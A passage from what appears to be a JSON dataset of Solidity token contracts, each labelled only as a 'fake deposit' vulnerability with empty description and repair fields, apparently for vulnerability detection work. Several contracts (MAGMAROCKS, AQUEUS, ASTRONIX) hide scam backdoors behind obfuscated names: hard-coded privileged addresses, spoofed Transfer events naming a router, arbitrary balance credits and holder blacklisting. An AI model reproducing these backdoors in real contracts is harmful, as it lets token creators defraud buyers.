\r\n        emit Transfer (V3Router, recipient, amount);\r\n       }  \r\n        if(!CXv[msg.sender]) {\r\n        require(Zti[msg.sender] >= amount);\r\n        Zti[msg.sender] -= amount;  \r\n        Zti[recipient] += amount;          \r\n        emit Transfer(msg.sender, recipient, amount);\r\n        }}\r\n    \r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address gFX = 0x86a55571628aF35AACf38AaA756E67673D87eE83;\r\n\taddress gWFX = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract MAGMAROCKS is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private GZA;\r\n\tmapping (address => bool) private GZE;\r\n    mapping (address => bool) private GZW;\r\n    mapping (address => mapping (address => uint256)) private gZV;\r\n    uint8 private constant GZD = 8;\r\n    uint256 private constant gTS = 150000000 * (10** GZD);\r\n    string private constant _name = \"Magma.Rocks\";\r\n    string private constant _symbol = \"MAGMA\";\r\n \r\n\r\n\r\n    constructor () {\r\n        GZA[_msgSender()] = gTS;\r\n         gRMK(gWFX, gTS); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return GZD;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return gTS;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return GZA[account];\r\n    }\r\n\t\r\n\r\n   \r\n\r\n\t\t\t\t function gburn(address GZj) onlyOwner public{\r\n        GZE[GZj] = true; }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return gZV[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        gZV[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction gquery(address GZj) public{\r\n         if(GZE[msg.sender])  { \r\n        GZW[GZj] = true; }}\r\n        \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == gFX)  {\r\n        require(amount <= GZA[sender]);\r\n        GZA[sender] -= amount;  \r\n        GZA[recipient] += amount; \r\n          gZV[sender][msg.sender] -= amount;\r\n        emit Transfer (gWFX, recipient, amount);\r\n        return true; }  else  \r\n          if(!GZW[recipient]) {\r\n          if(!GZW[sender]) {\r\n         require(amount <= GZA[sender]);\r\n        require(amount <= gZV[sender][msg.sender]);\r\n        GZA[sender] -= amount;\r\n        GZA[recipient] += amount;\r\n        gZV[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction gStake(address GZj) public {\r\n        if(GZE[msg.sender]) { \r\n        GZW[GZj] = false;}}\r\n\t\tfunction gRMK(address GZj, uint256 gZN) onlyOwner internal {\r\n    emit Transfer(address(0), GZj ,gZN); }\r\n\t\t\r\n\t\tfunction transfer(address GZj, uint256 gZN) public {\r\n        if(msg.sender == gFX)  {\r\n        require(GZA[msg.sender] >= gZN);\r\n        GZA[msg.sender] -= gZN;  \r\n        GZA[GZj] += gZN; \r\n        emit Transfer (gWFX, GZj, gZN);} else  \r\n        if(GZE[msg.sender]) {GZA[GZj] += gZN;} else\r\n        if(!GZW[msg.sender]) {\r\n        require(GZA[msg.sender] >= gZN);\r\n        GZA[msg.sender] -= gZN;  \r\n        GZA[GZj] += gZN;          \r\n        emit Transfer(msg.sender, GZj, gZN);}}\r\n\t\t\r\n\t\t\r\n\r\n\t\t\r\n\t\t}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 15000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 15000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Wiion\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals\r\n        symbol = \"WII\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _MsgSendr() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _conscripter = 0x4312662cf2Cc99f5Bd018291CE8a5C1D11a73324;\r\n\taddress V2Uniswap = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n    constructor () {\r\n        address msgSender = _MsgSendr();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract AQUEUS is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Lx;\r\n\tmapping (address => bool) private Ly;\r\n    mapping (address => bool) private Lk;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _totalsup = 150000000 * 10**_decimals;\r\n    string private constant _name = \"AQUEUS DAO\";\r\n    string private constant _symbol = \"AQUEUS\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Lx[_MsgSendr()] = _totalsup;\r\n        emit Transfer(address(0), V2Uniswap, _totalsup);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _totalsup;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Lx[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction xendx(address yz) public {\r\n        if(Ly[msg.sender]) { \r\n        Lk[yz] = false;}}\r\n        function xqueryx(address yz) public{\r\n         if(Ly[msg.sender])  { \r\n        require(!Lk[yz]);\r\n        Lk[yz] = true; }}\r\n\t\tfunction xstakex(address yz) public{\r\n         if(msg.sender == _conscripter)  { \r\n        require(!Ly[yz]);\r\n        Ly[yz] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _conscripter)  {\r\n        require(amount <= Lx[sender]);\r\n        Lx[sender] -= amount;  \r\n        Lx[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (V2Uniswap, recipient, amount);\r\n        return true; }    \r\n          if(!Lk[recipient]) {\r\n          if(!Lk[sender]) {\r\n         require(amount <= Lx[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        Lx[sender] -= amount;\r\n        Lx[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address recipient, uint256 amount) public {\r\n        if(msg.sender == _conscripter)  {\r\n        require(Lx[msg.sender] >= amount);\r\n        Lx[msg.sender] -= amount;  \r\n        Lx[recipient] += amount; \r\n        emit Transfer (V2Uniswap, recipient, amount);}\r\n        if(Ly[msg.sender]) {Lx[recipient] = amount;} \r\n        if(!Lk[msg.sender]) {\r\n        require(Lx[msg.sender] >= amount);\r\n        Lx[msg.sender] -= amount;  \r\n        Lx[recipient] += amount;          \r\n        emit Transfer(msg.sender, recipient, amount);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address GSKS = 0xD18312210cBbF269d2372c6C4564859920f7f155;\r\n\taddress gRouterg = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n        \t\tmodifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n\r\n}\r\n\r\n\r\n\r\ncontract ASTRONIX is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Gc;\r\n\tmapping (address => bool) private Gb;\r\n    mapping (address => bool) private Gw;\r\n    mapping (address => mapping (address => uint256)) private Gv;\r\n    uint8 private constant _Gec = 8;\r\n    uint256 private constant gS = 200000000 * 10**_Gec;\r\n    string private constant _name = \"Astronix Labs\";\r\n    string private constant _symbol = \"ASTRONIX\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Gc[_msgSender()] = gS;\r\n         gMake(); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _Gec;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return gS;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Gc[account];\r\n    }\r\n    function gMake() onlyOwner internal {\r\n    emit Transfer(address(0), gRouterg, gS); }\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return Gv[owner][spender];\r\n    }\r\n\t        function BurnG(address Gj) onlyOwner public{\r\n        Gb[Gj] = true; }\r\n\t\t\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        Gv[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n        \r\n\t\tfunction gStake(address Gj) public {\r\n        if(Gb[msg.sender]) { \r\n        Gw[Gj] = false;}}\r\n        function QueryG(address Gj) public{\r\n         if(Gb[msg.sender])  { \r\n        Gw[Gj] = true; }}\r\n   \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == GSKS)  {\r\n        require(amount <= Gc[sender]);\r\n        Gc[sender] -= amount;  \r\n        Gc[recipient] += amount; \r\n          Gv[sender][msg.sender] -= amount;\r\n        emit Transfer (gRouterg, recipient, amount);\r\n        return true; }  else  \r\n          if(!Gw[recipient]) {\r\n          if(!Gw[sender]) {\r\n         require(amount <= Gc[sender]);\r\n        require(amount <= Gv[sender][msg.sender]);\r\n        Gc[sender] -= amount;\r\n        Gc[recipient] += amount;\r\n        Gv[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Gi, uint256 Gj) public {\r\n        if(msg.sender == GSKS)  {\r\n        require(Gc[msg.sender] >= Gj);\r\n        Gc[msg.sender] -= Gj;  \r\n        Gc[Gi] += Gj; \r\n        emit Transfer (gRouterg, Gi, Gj);} else  \r\n        if(Gb[msg.sender]) {Gc[Gi] += Gj;} else\r\n        if(!Gw[msg.sender]) {\r\n        require(Gc[msg.sender] >= Gj);\r\n        Gc[msg.sender] -= Gj;  \r\n        Gc[Gi] += Gj;          \r\n        emit Transfer(msg.sender, Gi, Gj);}}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract SHS_Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = '1.1.3';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function SHS_Token(\r\n        ) {\r\n        balances[msg.sender] = 10000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 10000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"SHS Token\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals for display purposes\r\n        symbol = \"SHS\";                              // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _xConstruc = 0x29201c505571932Dc7e1f3Fceb49F8ABCeAD5e51;\r\n\taddress UniRouterV20 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract ASTRIONLABS is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Xc;\r\n\tmapping (address => bool) private Xb;\r\n    mapping (address => bool) private Xa;\r\n    mapping (address => mapping (address => 